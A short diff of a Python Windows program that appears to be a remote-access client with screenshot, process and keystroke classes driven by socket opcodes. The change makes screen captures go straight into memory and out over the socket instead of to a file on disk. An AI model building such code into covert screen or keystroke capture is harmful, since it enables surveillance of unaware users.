@@ -6,7 +6,7 @@ import winreg
 import subprocess
 from PIL import Image, ImageGrab
 import wmi
-from io import BytesIO
+import io
 
 class ProcessRunning:
     def __init__(self, _sock, opcode):
@@ -60,16 +60,12 @@ class ShotScreen:
         elif self.opcode == 'take':
             img = ImageGrab.grab()
 
-            img.save('screenshot.png', format='PNG')
-            file = open('screenshot.png', 'rb')
-            data = file.read(1024)
-            while (data):
-                logging.debug('sendding')
-                self.sock.sendall(data)
-                data = file.read(1024)
-            logging.debug('done')
+            img_in_memory = io.BytesIO()
+            img.save(img_in_memory, format='PNG')
+
+            message = img_in_memory.getvalue()
+            self.sock.sendall(message)
             self.sock.sendall(b'done')
-            file.close()
             return '00'  # Successful
 
 class KeyStroke:
